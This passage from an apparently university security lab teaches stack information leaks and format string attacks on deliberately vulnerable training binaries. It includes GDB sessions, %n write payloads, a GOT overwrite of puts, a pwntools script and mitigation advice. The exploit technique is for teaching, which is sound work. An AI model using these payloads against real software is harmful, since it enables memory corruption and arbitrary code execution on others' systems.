&lt;/code>&lt;/pre>&lt;p>We see we have an information leak. We leak one piece of data above: &lt;code>0x7fffffffdcf0&lt;/code>. If we run multiple times we can see that the values for the first piece of information differs:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ python -c &amp;#39;import sys; sys.stdout.write(32*&amp;#34;A&amp;#34;)&amp;#39; | ./info_leak | xxd | grep &amp;#39;,&amp;#39;
00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768 AAAAAA......, wh
&lt;/code>&lt;/pre>&lt;p>The variable part is related to a stack address (it starts with &lt;code>0x7f&lt;/code>); it varies because ASLR is enabled. We want to look more carefully using GDB and figure out what the variable value represents:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ gdb -q ./info_leak
Reading symbols from ./info_leak...done.
gdb-peda$ b my_main
Breakpoint 1 at 0x400560
gdb-peda$ r &amp;lt; &amp;lt;(python -c &amp;#39;import sys; sys.stdout.write(32*&amp;#34;A&amp;#34;)&amp;#39;)
Starting program: info_leak &amp;lt; &amp;lt;(python -c &amp;#39;import sys; sys.stdout.write(32*&amp;#34;A&amp;#34;)&amp;#39;)
[...]
 
# Do next instructions until after the call to printf.
gdb-peda$ ni
....
 
gdb-peda$ x/12g name
0x7fffffffdc20: 0x4141414141414141 0x4141414141414141
0x7fffffffdc30: 0x4141414141414141 0x4141414141414141
0x7fffffffdc40: 0x00007fffffffdc50 0x00000000004007aa
gdb-peda$ x/2i 0x004007aa
0x4007aa &amp;lt;main+9&amp;gt;: mov edi,0x4008bc
0x4007af &amp;lt;main+14&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt;
gdb-peda$ pdis main
Dump of assembler code for function main:
0x00000000004007a1 &amp;lt;+0&amp;gt;: push rbp
0x00000000004007a2 &amp;lt;+1&amp;gt;: mov rbp,rsp
0x00000000004007a5 &amp;lt;+4&amp;gt;: call 0x400756 &amp;lt;my_main&amp;gt;
0x00000000004007aa &amp;lt;+9&amp;gt;: mov edi,0x4008bc
0x00000000004007af &amp;lt;+14&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt;
0x00000000004007b4 &amp;lt;+19&amp;gt;: mov eax,0x0
0x00000000004007b9 &amp;lt;+24&amp;gt;: pop rbp
0x00000000004007ba &amp;lt;+25&amp;gt;: ret
End of assembler dump.
gdb-peda$
&lt;/code>&lt;/pre>&lt;p>From the GDB above, we determine that, after our buffer, there is the stored &lt;code>rbp&lt;/code> (i.e. old rbp).&lt;/p>
&lt;p>In 32-bit program there would (usually) be 2 leaked values:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>The old &lt;code>ebp&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The return address of the function&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>This happens if the values of the old &lt;code>ebp&lt;/code> and the return address don't have any &lt;code>\x00&lt;/code> bytes.&lt;/p>
&lt;p>in the 64-bit example we only get the old &lt;code>rbp&lt;/code> because the 2 high bytes of the stack address are always &lt;code>0&lt;/code> which causes the string to be terminated early.&lt;/p>
&lt;p>When we leak the two values we are able to retrieve the stored &lt;code>rbp&lt;/code> value. In the above run the value of &lt;code>rbp&lt;/code> is &lt;code>0x00007fffffffdc50&lt;/code>. We also see that the stored &lt;code>rbp&lt;/code> value is stored at &lt;strong>address&lt;/strong> &lt;code>0x7fffffffdc40&lt;/code>, which is the address current &lt;code>rbp&lt;/code>. We have the situation in the below diagram:&lt;/p>
&lt;p>&lt;img src="https://ocw.cs.pub.ro/courses/_media/cns/labs/info-leak-stack-64.png" alt="">&lt;/p>
&lt;p>We marked the stored &lt;code>rbp&lt;/code> value (i.e. the frame pointer for &lt;code>main()&lt;/code>: &lt;code>0x7fffffffdc50&lt;/code>) with the font color red in both places.&lt;/p>
&lt;p>In short, if we leak the value of the stored &lt;code>rbp&lt;/code> (i.e. the frame pointer for &lt;code>main()&lt;/code>: &lt;code>0x00007fffffffdc50&lt;/code>) we can determine the address of the current &lt;code>rbp&lt;/code> (i.e. the frame pointer for &lt;code>my_main()&lt;/code>: &lt;code>0x7fffffffdc40&lt;/code>), by subtracting &lt;code>16&lt;/code>. The address where the
&lt;code>my_main()&lt;/code> return address is stored (&lt;code>0x7fffffffdc48&lt;/code>) is computed by subtracting &lt;code>8&lt;/code> from the leaked &lt;code>rbp&lt;/code> value. By overwriting the value at this address we will force an arbitrary code execution and call &lt;code>my_evil_func()&lt;/code>.&lt;/p>
&lt;p>In order to write the return address of the &lt;code>my_main()&lt;/code> function with the address of the &lt;code>my_evil_func()&lt;/code> function, make use of the
conveniently (but not realistically) placed &lt;code>my_memory_write()&lt;/code> function. The &lt;code>my_memory_write()&lt;/code> allows the user to write arbitrary
values to arbitrary memory addresses.&lt;/p>
&lt;p>Considering all of this, update the &lt;code>TODO&lt;/code> lines of the &lt;code>exploit.py&lt;/code> script to make it call the &lt;code>my_evil_func()&lt;/code> function.&lt;/p>
&lt;p>Same as above, use &lt;code>nm&lt;/code> to determine address of the &lt;code>my_evil_func()&lt;/code> function. When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint. The precompiled binary can be found in &lt;a href="/courses/cns/resources/repo" title="cns:resources:repo">the CNS public repository&lt;/a>.&lt;/p>
&lt;p>Use the above logic to determine the &lt;code>old rbp&lt;/code> leak and then the address of the &lt;code>my_main()&lt;/code> return address.&lt;/p>
&lt;p>See &lt;a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack" title="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack">here&lt;/a> examples of using the &lt;code>unpack()&lt;/code> function.&lt;/p>
&lt;p>In case of a successful exploit the program will spawn a shell in the &lt;code>my_evil_func()&lt;/code> function, same as below:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">$ python exploit.py
[!] Could not find executable &amp;#39;info_leak&amp;#39; in $PATH, using &amp;#39;./info_leak&amp;#39; instead
[+] Starting local process &amp;#39;./info_leak&amp;#39;: pid 6422
[*] old_rbp is 0x7fffffffdd40
[*] return address is located at is 0x7fffffffdd38
[*] Switching to interactive mode
Returning from main!
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
&lt;/code>&lt;/pre>&lt;p>The rule of thumb is: &lt;strong>Always know your string length.&lt;/strong>&lt;/p>
&lt;h4 id="format-string-attacks">Format String Attacks&lt;/h4>
&lt;hr>
&lt;p>We will now see how (im)proper use of &lt;code>printf&lt;/code> may provide us with ways of extracting information or doing actual attacks.&lt;/p>
&lt;p>Calling &lt;code>printf&lt;/code> or some other string function that takes a format string as a parameter, directly with a string which is supplied by the user leads to a vulnerability called &lt;strong>format string attack&lt;/strong>.&lt;/p>
&lt;p>The definition of &lt;code>printf&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">int printf(const char *format, ...);
&lt;/code>&lt;/pre>&lt;p>Let's recap some of &lt;a href="http://www.cplusplus.com/reference/cstdio/printf/" title="http://www.cplusplus.com/reference/cstdio/printf/">useful formats&lt;/a>:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>%08x&lt;/code> &amp;ndash; prints a number in hex format, meaning takes a number from the stack and prints in hex format&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>%s&lt;/code> &amp;ndash; prints a string, meaning takes a pointer from the stack and prints the string from that address&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>%n&lt;/code> &amp;ndash; writes the number of bytes written so far to the address given as a parameter to the function (takes a pointer from the stack). This format is not widely used but it is in the C standard.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>%x&lt;/code> and &lt;code>%n&lt;/code> are enough to have memory read and write and hence, to successfully exploit a vulnerable program that calls printf (or other format string function) directly with a string controlled by the user.
:::&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="example-2">Example 2&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">printf(my_string);
&lt;/code>&lt;/pre>&lt;p>The above snippet is a good example of why ignoring compile time warnings is dangerous. The given example is easily detected by a static checker.&lt;/p>
&lt;p>Try to think about:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>The peculiarities of &lt;code>printf&lt;/code> (variable number of arguments)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Where &lt;code>printf&lt;/code> stores its arguments (&lt;em>hint&lt;/em>: on the stack)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What happens when &lt;code>my_string&lt;/code> is &lt;code>&amp;quot;%x&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>How matching between format strings (e.g. the one above) and arguments is enforced (&lt;em>hint&lt;/em>: it's not) and what happens in general when the number of arguments doesn't match the number of format specifiers&lt;/p>
&lt;/li>
&lt;li>
&lt;p>How we could use this to cause information leaks and arbitrary memory writes (&lt;em>hint&lt;/em>: see the format specifiers at the beginning of the section)&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>:::&lt;/p>
&lt;h3 id="example-3">Example 3&lt;/h3>
&lt;p>We would like to check some of the well known and not so-well known features of &lt;a href="http://man7.org/linux/man-pages/man3/printf.3.html" title="http://man7.org/linux/man-pages/man3/printf.3.html">the printf function&lt;/a>.
Some of them may be used for information leaking and for attacks such as format string attacks.&lt;/p>
&lt;p>Go into &lt;code>printf-features/&lt;/code> subfolder and browse the &lt;code>printf-features.c&lt;/code> file. Compile the executable file using:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">make
&lt;/code>&lt;/pre>&lt;p>and then run the resulting executable file using&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">./printf-features
&lt;/code>&lt;/pre>&lt;p>Go through the &lt;code>printf-features.c&lt;/code> file again and check how print, length and conversion specifiers are used by &lt;code>printf&lt;/code>. We will make use of the &lt;code>%n&lt;/code> feature that allows memory writes, a requirement for attacks.
:::&lt;/p>
&lt;h3 id="basic_format_string_attack" class="sectionedit11">Basic Format String Attack&lt;/h3>
&lt;p>You will now do a basic format string attack using the &lt;code>03-basic-format-string/&lt;/code> subfolder. The source code is in &lt;code>basic_format_string.c&lt;/code> and the executable is in &lt;code>basic_format_string&lt;/code>.&lt;/p>
&lt;p>You need to use &lt;code>%n&lt;/code> to overwrite the value of the &lt;code>v&lt;/code> variable to &lt;code>0x300&lt;/code>. You have to do three steps:&lt;/p>
&lt;p>1.Determine the address of the &lt;code>v&lt;/code> variable using &lt;code>nm&lt;/code>.&lt;/p>
&lt;p>2.Determine the &lt;code>n&lt;/code>-th parameter of &lt;code>printf()&lt;/code> that you can write to using &lt;code>%n&lt;/code>. The &lt;code>buffer&lt;/code> variable will have to be that parameter; you will store the address of the &lt;code>v&lt;/code> variable in the &lt;code>buffer&lt;/code> variable.&lt;/p>
&lt;p>3.Construct a format string that enables the attack; the number of characters processed by &lt;code>printf()&lt;/code> until &lt;code>%n&lt;/code> is matched will have to be &lt;code>0x300&lt;/code>.&lt;/p>
&lt;p>For the second step let's run the program multiple times and figure out where the &lt;code>buffer&lt;/code> address starts. We fill &lt;code>buffer&lt;/code> with the &lt;code>aaaa&lt;/code> string and we expect to discover it using the &lt;code>printf()&lt;/code> format specifiers.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">$ ./basic_format_string
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
7fffffffdcc07fffffffdcc01f6022897ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25
$ ./basic_format_string
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
x7fffffffdcc07fffffffdcc0116022917ffff7dd18d06c6c25786c6c25786c6c25786c6c25786c6c25786c6c25787fffffffdcc07fffffffdcc01f6022917ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a
$ ./basic_format_string
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a4141414141414141
&lt;/code>&lt;/pre>&lt;p>In the last run we get the &lt;code>4141414141414141&lt;/code> representation of &lt;code>AAAAAAAA&lt;/code>. That means that, if we replace the final &lt;code>%lx&lt;/code> with &lt;code>%n&lt;/code>, we will write at the address &lt;code>0x4141414141414141&lt;/code> the number of characters processed so far:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">$ echo -n &amp;#39;7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a&amp;#39; | wc -c
162
&lt;/code>&lt;/pre>&lt;p>We need that number to be &lt;code>0x300&lt;/code>. You can fine tune the format string by using a construct such as &lt;code>%32llx&lt;/code> to print a number on &lt;code>32&lt;/code> characters instead of a maximum of &lt;code>16&lt;/code> characters. See how much extra room you need and see if you reach &lt;code>0x300&lt;/code> bytes.&lt;/p>
&lt;p>The construct needn't use a multiple of &lt;code>8&lt;/code> for length. You may use the &lt;code>%32llx&lt;/code> or &lt;code>%33llx&lt;/code> or &lt;code>%42llx&lt;/code>. The numeric argument states the length of the print output.&lt;/p>
&lt;p>After the plan is complete, write down the attack by filling the &lt;code>TODO&lt;/code> lines in the &lt;code>exploit.py&lt;/code> solution skeleton.&lt;/p>
&lt;p>When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint. The precompiled binary can be found in &lt;a href="/courses/cns/resources/repo" title="cns:resources:repo">the CNS public repository&lt;/a>.&lt;/p>
&lt;p>After you write 0x300 chars in v, you should obtain shell&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">$ python exploit64.py
[!] Could not find executable &amp;#39;basic_format_string&amp;#39; in $PATH, using &amp;#39;./basic_format_string&amp;#39; instead
[+] Starting local process &amp;#39;./basic_format_string&amp;#39;: pid 20785
[*] Switching to interactive mode
7fffffffdcc0 7fffffffdcc01f60229b7ffff7dd18d03125786c6c393425786c6c25786c6c34786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25a6e25
$
&lt;/code>&lt;/pre>&lt;h3 id="extraformat_string_attack" class="sectionedit12">Extra: Format String Attack&lt;/h3>
&lt;p>Go to the &lt;code>04-format-string/&lt;/code> subfolder. In this task you will be working with a &lt;strong>32-bit binary&lt;/strong>.&lt;/p>
&lt;p>The goal of this task is to call &lt;code>my_evil_func&lt;/code> again. This task is also tutorial based.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">int
main(int argc, char *argv[])
{
printf(argv[1]);
printf(&amp;#34;\nThis is the most useless and insecure program!\n&amp;#34;);
return 0;
}
&lt;/code>&lt;/pre>&lt;h4 id="transform_format_string_attack_to_a_memory_write">Transform Format String Attack to a Memory Write&lt;/h4>
&lt;p>Any string that represents a useful format (e.g. &lt;code>%d&lt;/code>, &lt;code>%x&lt;/code> etc.) can be used to discover the vulnerability.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ ./format &amp;#34;%08x %08x %08x %08x&amp;#34;
00000000 f759d4d3 00000002 ffd59bd4
This is the most useless and insecure program!
&lt;/code>&lt;/pre>&lt;p>The values starting with 0xf are very likely pointers. Again, we can use this vulnerability as a information leakage. But we want more.&lt;/p>
&lt;p>Another useful format for us is &lt;code>%m$&lt;/code> followed by any normal format selector. Which means that the &lt;code>m&lt;/code>th parameter is used as an input for the following format. &lt;code>%10$08x&lt;/code> will print the &lt;code>10&lt;/code>th paramater with &lt;code>%08x&lt;/code>. This allows us to do a precise access of the stack.&lt;/p>
&lt;p>Example:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ ./format &amp;#34;%08x %08x %08x %08x %1\$08x %2\$08x %3\$08x %4\$08x&amp;#34;
00000000 f760d4d3 00000002 ff9aca24 00000000 f760d4d3 00000002 ff9aca24
This is the most useless and insecure program!
&lt;/code>&lt;/pre>&lt;p>Note the equivalence between formats.&lt;/p>
&lt;p>Now, because we are able to select &lt;em>any&lt;/em> higher address with this function and because the buffer is on the stack, sooner or later we will discover our own buffer.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ ./format &amp;#34;$(python -c &amp;#39;print(&amp;#34;%08x\n&amp;#34; * 10000)&amp;#39;)&amp;#34;
&lt;/code>&lt;/pre>&lt;p>Depending on your setup you should be able to view the hex
representation of the string &amp;ldquo;%08x\n&amp;rdquo;.&lt;/p>
&lt;p>&lt;strong>Why do we need our own buffer?&lt;/strong> Remember the &lt;code>%n&lt;/code> format? It can be used to write at an address given as parameter. The idea is to give this address as parameter and achieve memory writing. We will see later how to control the value.&lt;/p>
&lt;p>The next steps are done with ASLR disabled. In order to disable ASLR,
please run&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
&lt;/code>&lt;/pre>&lt;p>By trial and error or by using GDB (breakpoint on &lt;code>printf&lt;/code>) we can determine where the buffer starts&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ ./format &amp;#34;$(python -c &amp;#39;import sys; sys.stdout.buffer.write(b&amp;#34;ABCD&amp;#34; + b&amp;#34;%08x\n &amp;#34; * 0x300)&amp;#39;)&amp;#34; | grep -n 41 | head
10: ffffc410
52: ffffcc41
72: ffffcf41
175: 44434241
&lt;/code>&lt;/pre>&lt;p>Command line Python exploits tend to get very tedious and hard to read when the payload gets more complex. You can use the following reference pwntools script to write your exploit. The code is equivalent to the above one-liner.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">#!/usr/bin/env python3
 
from pwn import *
 
stack_items = 200
 
pad = b&amp;#34;ABCD&amp;#34;
val_fmt = b&amp;#34;%08x\n &amp;#34;
# add a \n at the end for consistency with the command line run
fmt = pad + val_fmt * stack_items + b&amp;#34;\n&amp;#34;
 
io = process([&amp;#34;./format&amp;#34;, fmt])
 
io.interactive()
&lt;/code>&lt;/pre>&lt;p>Then call the &lt;code>format&lt;/code> using:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">$ python exploit.py
&lt;/code>&lt;/pre>&lt;p>One idea is to keep things in multiple of 4, like &amp;ldquo;%08x \n&amp;rdquo;. If you are looking at line &lt;code>175&lt;/code> we have &lt;code>44434241&lt;/code> which is the base 16 representation of &lt;code>“ABCD”&lt;/code> (because it's little endian). Note, you can add as many format strings you want, the start of the buffer will be the same (more or less).&lt;/p>
&lt;p>We can compress our buffer by specifying the position of the argument.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ ./format $(python -c &amp;#39;import sys; sys.stdout.buffer.write(b&amp;#34;ABCD&amp;#34; + b&amp;#34;AAAAAAAA&amp;#34; * 199 + b&amp;#34;%175$08x&amp;#34;)&amp;#39;)
ABCDAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAA44434241
This is the most useless and insecure program!
&lt;/code>&lt;/pre>&lt;p>&lt;code>b”AAAAAAAA” * 199&lt;/code> is added to maintain the length of the original string, otherwise the offset might change.&lt;/p>
&lt;p>You can see that the last information is our b&amp;quot;ABCD&amp;quot; string printed with &lt;code>%08x&lt;/code> this means that we know where our buffer is.&lt;/p>
&lt;p>You need to enable core dumps in order to reproduce the steps below:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">$ ulimit -c unlimited
&lt;/code>&lt;/pre>&lt;p>The steps below work an a given version of libc and a given system. It's why the instruction that causes the fault is&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">mov %edx,(%eax)
&lt;/code>&lt;/pre>&lt;p>or the equivalent in Intel syntax&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">mov DWORD PTR [eax], edx
&lt;/code>&lt;/pre>&lt;p>It may be different on your system, for example &lt;code>edx&lt;/code> may be replaced by &lt;code>esi&lt;/code>, cuch as&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">mov DWORD PTR [eax], esi
&lt;/code>&lt;/pre>&lt;p>Update the explanations below accordingly.&lt;/p>
&lt;p>Remove any core files you may have generated before testing yourprogram:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">rm -f core
&lt;/code>&lt;/pre>&lt;p>We can replace &lt;code>%08x&lt;/code> with &lt;code>%n&lt;/code> this should lead to segmentation fault.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ ./format &amp;#34;$(python -c &amp;#39;import sys; sys.stdout.buffer.write(b&amp;#34;ABCD&amp;#34; + b&amp;#34;AAAAAAAA&amp;#34; * 199 + b&amp;#34;%175$08n&amp;#34;)&amp;#39;)&amp;#34;
Segmentation fault (core dumped)
$ gdb ./format -c core
...
Core was generated by `./format BCDEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;#39;.
Program terminated with signal 11, Segmentation fault.
#0 0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) bt
#0 0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
#1 0xf7e5deff in printf () from /lib/i386-linux-gnu/libc.so.6
#2 0x08048468 in main (argc=2, argv=0xffffd2f4) at format.c:18
(gdb) x/i $eip
=&amp;gt; 0xf7e580a2 &amp;lt;vfprintf+17906&amp;gt;: mov %edx,(%eax)
(gdb) info registers $edx $eax
edx 0x202 1596
eax 0x44434241 1145258561
(gdb) quit
&lt;/code>&lt;/pre>&lt;p>Bingo. We have memory write. The vulnerable code tried to write at the address &lt;code>0x44434241&lt;/code> (&amp;ldquo;ABCD&amp;rdquo; little endian) the value 1596. The value 1596 is the amount of data wrote so far by &lt;code>printf&lt;/code>(&lt;code>“ABCD” + 199 * “AAAAAAAA”&lt;/code>).&lt;/p>
&lt;p>Right now, our input string has 1605 bytes (1604 with a &lt;code>\n&lt;/code> at the end). But we can further compress it, thus making the value that we write independent of the length of the input.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ ./format &amp;#34;$(python -c &amp;#39;import sys; sys.stdout.buffer.write(&amp;#34;ABCD&amp;#34; + &amp;#34;A&amp;#34; * 1588 + &amp;#34;%99x&amp;#34; + &amp;#34;%126$08n&amp;#34;)&amp;#39;)&amp;#34;
Segmentation fault (core dumped)
$ gdb ./format -c core
(gdb) info registers $edx $eax
edx 0x261 1691
eax 0x44434241 1145258561
(gdb) quit
&lt;/code>&lt;/pre>&lt;p>Here we managed to write 1691 (4+1588+99). Note we should keep the number of bytes before the format string the same. Which means that if we want to print with a padding of 100 (three digits) we should remove one &lt;code>A&lt;/code>. You can try this by yourself.&lt;/p>
&lt;p>&lt;strong>How far can we go?&lt;/strong> Probably we can use any integer for specifying the number of bytes which are used for a format, but we don't need this; moreover specifying a very large padding is not always feasible, think what happens when printing with &lt;code>snprintf&lt;/code>. 255 should be enough.&lt;/p>
&lt;p>Remember, we want to write a value to a certain address. So far we control the address, but the value is somewhat limited. If we want to write 4 bytes at a time we can make use of the endianess of the machine. &lt;strong>The idea&lt;/strong> is to write at the address n and then at the address n+1 and so on.&lt;/p>
&lt;p>Lets first display the address. We are using the address &lt;code>0x804c014&lt;/code>. This address is the address of the got entry for the puts function. Basically, we will override the got entry for the puts.&lt;/p>
&lt;p>Check the &lt;code>exploit.py&lt;/code> script from the task directory, read the commends and understand what it does.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ python exploit.py
[*] &amp;#39;format&amp;#39;
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x8048000)
[+] Starting local process &amp;#39;./format&amp;#39;: pid 29030
[*] Switching to interactive mode
[*] Process &amp;#39;./format&amp;#39; stopped with exit code 0 (pid 29030)
\x14\x04\x15\x04\x17\x04\x18\x04 804c014 804c015 804c017 804c018 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
This is the most useless and insecure program!
&lt;/code>&lt;/pre>&lt;p>The output starts with &lt;code>\x14\x04\x15\x04\x17\x04\x18\x04 804c014 804c015 804c017 804c018&lt;/code> which is the 4 addresses we have written (raw, little endian) followed by the numerical prints done with &lt;code>%x&lt;/code> of the same addresses.&lt;/p>
&lt;p>If you have the same output it means that now, if you replace &lt;code>%x&lt;/code> with &lt;code>%n&lt;/code> (change &lt;code>fmt = write_fmt&lt;/code> in the script) it will try to write something at those valid addresses.&lt;/p>
&lt;p>We want to put the value &lt;code>0x080491a6&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">$ objdump -d ./format | grep my_evil
080491a6 &amp;lt;my_evil_func&amp;gt;:
&lt;/code>&lt;/pre>&lt;p>As &lt;code>%n&lt;/code> writes how many characters have been printed until it is reached, each &lt;code>%n&lt;/code> will print an incrementally larger value. We use the 4 adjacent adressess to write byte by byte and use overflows to reach a lower value for the next byte. For example, after writing &lt;code>0xa6&lt;/code> we can write &lt;code>0x0191&lt;/code>:&lt;/p>
&lt;p>&lt;img src="https://ocw.cs.pub.ro/courses/_media/cns/labs/bytes_write.png" alt="">&lt;/p>
&lt;p>Also, the &lt;code>%n&lt;/code> count doesn't reset so, if we want to write &lt;code>0xa6&lt;/code> and then &lt;code>0x91&lt;/code> the payload should be in the form of:&lt;/p>
&lt;p>&lt;code>&amp;lt;0xa6 bytes&amp;gt;%n&amp;lt;0x100 - 0xa6 + 0x91 bytes&amp;gt;%n&lt;/code>&lt;/p>
&lt;p>As mentioned earlier above, instead writing N bytes &lt;code>“A” * N&lt;/code> you can use other format strings like &lt;code>%Nc&lt;/code> or &lt;code>%Nx&lt;/code> to keep the payload shorter.&lt;/p>
&lt;p>Bonus task** Can you get a shell? (Assume ASLR is disabled).&lt;/p>
&lt;h4 id="mitigation-and-recommendations">Mitigation and Recommendations&lt;/h4>
&lt;hr>
&lt;ol>
&lt;li>
&lt;p>Manage the string length carefully&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Don't use &lt;code>gets&lt;/code>. With &lt;code>gets&lt;/code> there is no way of knowing how much data was read&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use string functions with &lt;code>n&lt;/code> parameter, whenever a non constant string is involved. i.e. &lt;code>strnprintf&lt;/code>, &lt;code>strncat&lt;/code>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Make sure that the &lt;code>NUL&lt;/code> byte is added, for instance &lt;code>strncpy&lt;/code> does &lt;strong>not&lt;/strong> add a &lt;code>NUL&lt;/code> byte.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>wcstr*&lt;/code> functions when dealing with wide char strings.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Don't trust the user!&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h4 id="real-life-examples">Real life Examples&lt;/h4>
&lt;hr>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="http://xkcd.com/1354/" title="http://xkcd.com/1354/">Heartbleed&lt;/a>
Linux kernel through 3.9.4 &lt;a href="http://www.cvedetails.com/cve/CVE-2013-2851/" title="http://www.cvedetails.com/cve/CVE-2013-2851/">CVE-2013-2851&lt;/a>. The fix is &lt;a href="http://marc.info/?l=linux-kernel&amp;amp;m=137055204522556&amp;amp;w=2" title="http://marc.info/?l=linux-kernel&amp;amp;m=137055204522556&amp;amp;w=2">here&lt;/a>. More details &lt;a href="http://www.intelligentexploit.com/view-details-ascii.html?id=16609" title="http://www.intelligentexploit.com/view-details-ascii.html?id=16609">here&lt;/a>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Windows 7 &lt;a href="http://www.cvedetails.com/cve/CVE-2012-1851/" title="http://www.cvedetails.com/cve/CVE-2012-1851/">CVE-2012-1851&lt;/a>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Pidgin off the record plugin &lt;a href="http://www.cvedetails.com/cve/CVE-2012-2369" title="http://www.cvedetails.com/cve/CVE-2012-2369">CVE-2012-2369&lt;/a>. The fix is &lt;a href="https://bugzilla.novell.com/show_bug.cgi?id=762498#c1" title="https://bugzilla.novell.com/show_bug.cgi?id=762498#c1">here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="resources">Resources&lt;/h3>
&lt;hr>
&lt;p>&lt;a href="http://www.cert.org/books/secure-coding/" title="http://www.cert.org/books/secure-coding/">Secure Coding in C and C++&lt;/a>
&lt;a href="http://www.informit.com/articles/article.aspx?p=2036582" title="http://www.informit.com/articles/article.aspx?p=2036582">String representation in C&lt;/a>
&lt;a href="https://www.owasp.org/index.php/Improper_string_length_checking" title="https://www.owasp.org/index.php/Improper_string_length_checking">Improper string length checking&lt;/a>
&lt;a href="http://cwe.mitre.org/data/definitions/134.html" title="http://cwe.mitre.org/data/definitions/134.html">Format String definition&lt;/a>
&lt;a href="https://www.owasp.org/index.php/Format_string_attack" title="https://www.owasp.org/index.php/Format_string_attack">Format String Attack (OWASP)&lt;/a>
